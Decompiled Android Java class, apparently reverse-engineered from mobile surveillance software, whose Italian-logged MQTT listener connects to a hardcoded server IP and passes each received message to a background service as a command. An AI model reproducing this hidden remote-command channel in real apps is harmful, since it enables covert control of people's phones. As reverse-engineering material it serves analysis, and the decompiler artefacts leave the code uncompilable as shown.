package com.app.system.mqtt;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import com.android.system.CoreApp;
import com.app.system.common.h;
import com.app.system.common.service.EventsAndReceiveService;
import java.util.Timer;
import java.util.TimerTask;
import org.eclipse.paho.android.service.MqttAndroidClient;
import org.eclipse.paho.client.mqttv3.IMqttActionListener;
import org.eclipse.paho.client.mqttv3.IMqttDeliveryToken;
import org.eclipse.paho.client.mqttv3.IMqttToken;
import org.eclipse.paho.client.mqttv3.MqttCallbackExtended;
import org.eclipse.paho.client.mqttv3.MqttConnectOptions;
import org.eclipse.paho.client.mqttv3.MqttException;
import org.eclipse.paho.client.mqttv3.MqttMessage;

public class a
{
  private static a a;
  private static Object b = new Object();
  private String c = null;
  private MqttAndroidClient d = null;
  private MqttConnectOptions e = null;
  private Context f = null;
  private int g = 0;
  private Timer h = null;
  private int i = 1000;
  private boolean j = false;
  private Object k = new Object();
  
  public static a a()
  {
    try
    {
      if (a == null)
      {
        locala = new com/app/system/mqtt/a;
        locala.<init>();
        a = locala;
      }
      a locala = a;
      return locala;
    }
    finally {}
  }
  
  private void a(int paramInt)
  {
    StringBuilder localStringBuilder;
    if (this.h != null)
    {
      localStringBuilder = new StringBuilder();
      localStringBuilder.append("mFirstConnTimer != null, schedulo task con delay=");
      localStringBuilder.append(paramInt);
      com.security.d.a.d("MqttListener", localStringBuilder.toString(), new Object[0]);
      this.h.schedule(new a(null), paramInt);
    }
    else
    {
      localStringBuilder = new StringBuilder();
      localStringBuilder.append("Il timer precedente è stato cancellato, avvio ciclo connessione con delay=");
      localStringBuilder.append(paramInt);
      com.security.d.a.d("MqttListener", localStringBuilder.toString(), new Object[0]);
      this.i = paramInt;
      d();
    }
  }
  
  private void d()
  {
    com.security.d.a.d("MqttListener", "Inizio ciclo prima connessione MQTT", new Object[0]);
    this.h = new Timer("MQTT first connection");
    this.h.schedule(new a(null), this.i);
  }
  
  private void e()
  {
    com.security.d.a.d("MqttListener", "Fine ciclo prima connessione MQTT", new Object[0]);
    synchronized (this.k)
    {
      if (this.h != null)
      {
        this.h.cancel();
        this.h = null;
      }
      this.i = 1000;
      return;
    }
  }
  
  private void f()
  {
    if (this.d == null)
    {
      com.security.d.a.a("MqttListener", "Chiamata tryConnect() ma mClient è null!! Ciao!", new Object[0]);
      return;
    }
    try
    {
      Object localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      ((StringBuilder)localObject1).append("tryConnect() -- richiama mClient.connect(mConnectOptions");
      if (this.e == null) {
        localObject2 = "=null)";
      } else {
        localObject2 = "!=null";
      }
      ((StringBuilder)localObject1).append((String)localObject2);
      com.security.d.a.d("MqttListener", ((StringBuilder)localObject1).toString(), new Object[0]);
      localObject1 = this.d.connect(this.e);
      Object localObject2 = new com/app/system/mqtt/a$1;
      ((1)localObject2).<init>(this);
      ((IMqttToken)localObject1).setActionCallback((IMqttActionListener)localObject2);
    }
    catch (MqttException localMqttException)
    {
      localMqttException.printStackTrace();
    }
  }
  
  private void g()
  {
    try
    {
      IMqttToken localIMqttToken = this.d.subscribe(this.c, 1);
      IMqttActionListener local2 = new com/app/system/mqtt/a$2;
      local2.<init>(this);
      localIMqttToken.setActionCallback(local2);
    }
    catch (MqttException localMqttException)
    {
      localMqttException.printStackTrace();
    }
  }
  
  public void a(Context paramContext)
  {
    com.security.d.a.d("MqttListener", "MQTTListner INIT!!!!!", new Object[0]);
    this.f = paramContext;
    this.c = h.c(this.f);
    Object localObject = CoreApp.a().getSharedPreferences("pref", 0);
    paramContext = ((SharedPreferences)localObject).getString("DEST_SERVER_IP", "5.56.12.200");
    int m = ((SharedPreferences)localObject).getInt("DEST_SERVER_MQTT_PORT", 1883);
    localObject = new StringBuilder();
    ((StringBuilder)localObject).append("tcp://");
    ((StringBuilder)localObject).append(paramContext);
    ((StringBuilder)localObject).append(":");
    ((StringBuilder)localObject).append(m);
    paramContext = ((StringBuilder)localObject).toString();
    this.d = new MqttAndroidClient(this.f, paramContext, this.c);
    this.d.setCallback(new b(null));
    this.e = new MqttConnectOptions();
    this.e.setAutomaticReconnect(true);
    this.e.setCleanSession(false);
    d();
  }
  
  public boolean b()
  {
    return this.j;
  }
  
  public void c()
  {
    a(this.i);
  }
  
  private class a
    extends TimerTask
  {
    private a() {}
    
    public void run()
    {
      a.a(a.this);
    }
  }
  
  private class b
    implements MqttCallbackExtended
  {
    private b() {}
    
    public void connectComplete(boolean paramBoolean, String paramString)
    {
      a.a(a.this, true);
      StringBuilder localStringBuilder = new StringBuilder();
      localStringBuilder.append(String.format("Connessione con il broker %s completata", new Object[] { paramString }));
      if (paramBoolean) {
        paramString = " (riconnessione automatica)";
      } else {
        paramString = "";
      }
      localStringBuilder.append(paramString);
      com.security.d.a.d("MqttListener", localStringBuilder.toString(), new Object[0]);
      a.e(a.this);
    }
    
    public void connectionLost(Throwable paramThrowable)
    {
      a.a(a.this, false);
      com.security.d.a.d("MqttListener", "Connessione con il broker persa: ", new Object[] { paramThrowable });
      try
      {
        if (a.f(a.this) != null) {
          a.f(a.this).unsubscribe(a.g(a.this));
        }
      }
      catch (MqttException paramThrowable)
      {
        paramThrowable.printStackTrace();
      }
    }
    
    public void deliveryComplete(IMqttDeliveryToken paramIMqttDeliveryToken)
    {
      com.security.d.a.d("MqttListener", "deliveryComplete", new Object[0]);
    }
    
    public void messageArrived(String paramString, MqttMessage paramMqttMessage)
    {
      paramString = paramMqttMessage.toString();
      paramMqttMessage = new StringBuilder();
      paramMqttMessage.append("Messaggio ricevuto: ");
      paramMqttMessage.append(paramString);
      com.security.d.a.d("MqttListener", paramMqttMessage.toString(), new Object[0]);
      if (a.h(a.this) != null)
      {
        paramMqttMessage = new Intent(a.h(a.this), EventsAndReceiveService.class);
        paramMqttMessage.putExtra("event_core_app", "event_mqtt_msg");
        paramMqttMessage.putExtra("mqtt_msg_data", paramString);
        com.b.a.a.a.a(a.h(a.this), paramMqttMessage);
      }
      else
      {
        com.security.d.a.a("MqttListener", "Messaggio ricevuto ma mContext == null!!!", new Object[0]);
      }
    }
  }
}


/* Location:              ~/com/app/system/mqtt/a.class
 *
 * Reversed by:           J
 */